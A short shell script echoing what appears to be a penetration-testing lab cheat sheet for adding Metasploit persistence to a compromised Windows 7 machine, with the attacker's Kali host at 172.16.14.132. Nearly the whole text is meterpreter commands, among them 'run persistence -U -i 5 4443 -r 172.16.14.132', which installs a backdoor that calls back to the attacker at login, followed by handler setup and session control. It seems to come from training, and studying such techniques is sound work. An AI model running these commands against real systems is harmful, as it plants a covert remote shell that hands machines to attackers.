echo '
--] ADD PERSITANCE 41

OPERATOR   === KALI               IP === 132
TANGO      === WIN 7              IP === 134
LAB        === NET                ALL === 172.16.14.IP




OPERATOR    ==> TASK ==> session -i 2
OPERATOR    ==> TASK ==> meterpreter
OPERATOR    ==> TASK ==> run persistence -h
OPERATOR    ==> TASK ==> run persistence -U -i 5 4443 -r IP_OPERATOR
OPERATOR    ==> TASK ==> run persistence -U -i 5 4443 -r 172.16.14.132
OPERATOR    ==> TASK ==> background
OPERATOR    ==> TASK ==> session -i
OPERATOR    ==> TASK ==> session -k 2
OPERATOR    ==> TASK ==> set lport 4443
OPERATOR    ==> TASK ==> exploit -j
OPERATOR    ==> TASK ==> session -i 5



'
read